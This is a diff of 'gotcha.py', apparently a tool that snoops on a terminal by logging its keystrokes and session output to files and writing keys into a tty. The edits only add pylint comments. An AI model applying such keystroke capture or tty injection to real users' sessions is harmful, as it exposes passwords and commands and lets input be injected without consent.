@@ -1,7 +1,7 @@
 #!/usr/bin/python
 """gotcha.py
 """
-__updated__ = "2022-10-08 02:05:46"
+__updated__ = "2022-10-08 13:28:40"
 
 
 import termios
@@ -168,13 +168,13 @@ class GotchaTTY:
             # Create output files.
             # keys-%Y-%m-%d-%H%M.gotcha.log
             if not os.path.isfile(self.session_file):
-                open(self.session_file, "w").close()
+                open(self.session_file, "w").close()  # pylint: disable=unspecified-encoding
 
             # sess-%Y-%m-%d-%H%M.gotcha.log
             if not os.path.isfile(self.keystrokes_file):
-                open(self.keystrokes_file, "w").close()
+                open(self.keystrokes_file, "w").close()  # pylint: disable=unspecified-encoding
 
-            with open(self.keystrokes_file, "a") as _fo:
+            with open(self.keystrokes_file, "a") as _fo:  # pylint: disable=unspecified-encoding
                 _fo.write(f"{time.ctime()} {self.tty} {self.pid}:\n\n")
 
             _fdr = ""
@@ -230,7 +230,7 @@ class GotchaTTY:
                     # e.g. $ while true; do echo "boom!"; done
                     time.sleep(0.01)
 
-                except (BlockingIOError, Exception) as error:
+                except (BlockingIOError, Exception) as error:  # pylint: disable=broad-except
                     # BlockingIOError: [Errno 11] write could not complete without blocking
                     eprint(f"BlockingIOError: {error}")
                     self.working = False
@@ -354,7 +354,7 @@ class GotchaTTY:
             eprint(session_file)
             eprint("-" * len(session_file))
 
-            for line in open(self.session_file):
+            for line in open(self.session_file):  # pylint: disable=unspecified-encoding
                 try:
                     _d = json.loads(line)
                     now = float(_d["d"])
@@ -387,7 +387,7 @@ class GotchaTTY:
             # Replace special keys to readable values in output file
             pchar = SPECIAL_KEYS_DICT[pchar]
 
-        with open(self.keystrokes_file, "a") as _fi:
+        with open(self.keystrokes_file, "a") as _fi:  # pylint: disable=unspecified-encoding
             _fi.write(pchar)
 
     def write_session_file(self, output="") -> None:
@@ -427,12 +427,12 @@ class GotchaTTY:
                 for first, second in zip(lst[::columns], lst[1::columns]):
                     eprint(f"{first: <10}   {second: <10}")
             case 1:
-                [eprint(l) for l in lst]
+                [eprint(l) for l in lst]  # pylint: disable=expression-not-assigned
 
     def send_key(self, key: str, tty: any) -> None:
         """
         send_key
         """
-        with open(tty, "w") as _tty:
+        with open(tty, "w") as _tty:  # pylint: disable=unspecified-encoding
             _tty.write(key)
             _tty.close()
